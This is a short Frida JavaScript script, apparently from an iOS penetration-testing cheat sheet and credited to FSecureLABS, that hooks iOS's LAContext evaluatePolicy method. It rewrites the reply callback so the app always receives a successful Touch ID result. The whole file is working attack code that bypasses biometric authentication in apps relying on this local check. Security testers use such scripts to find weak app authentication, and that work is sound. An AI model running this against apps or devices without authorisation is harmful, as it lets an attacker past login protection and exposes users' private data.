/************************************************************************
 * Name: iOS Touch ID Bypass
 * OS: iOS
 * Author: @FSecureLABS (Credits to the author!)
 * Source: https://github.com/FSecureLABS/needle/blob/master/needle/modules/hooking/frida/script_touch-id-bypass.py
 * Edited: https://github.com/ivan-sincek/ios-penetration-testing-cheat-sheet/blob/main/scripts/ios-touch-id-bypass.js
 ************************************************************************/
setTimeout(function(){
	if (ObjC.available) {
		var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
		Interceptor.attach(hook.implementation, {
			onEnter: function(args) {
				console.log("Trying to bypass touch ID...");
				var block = new ObjC.Block(args[4]);
				const callback = block.implementation;
				block.implementation = function(error, value) {
					console.log("Touch ID has been bypassed successfully!");
					return callback(true, null);
				};
			}
		});
	} else {
		console.log("Objective-C Runtime is not available!");
	}
}, 0);
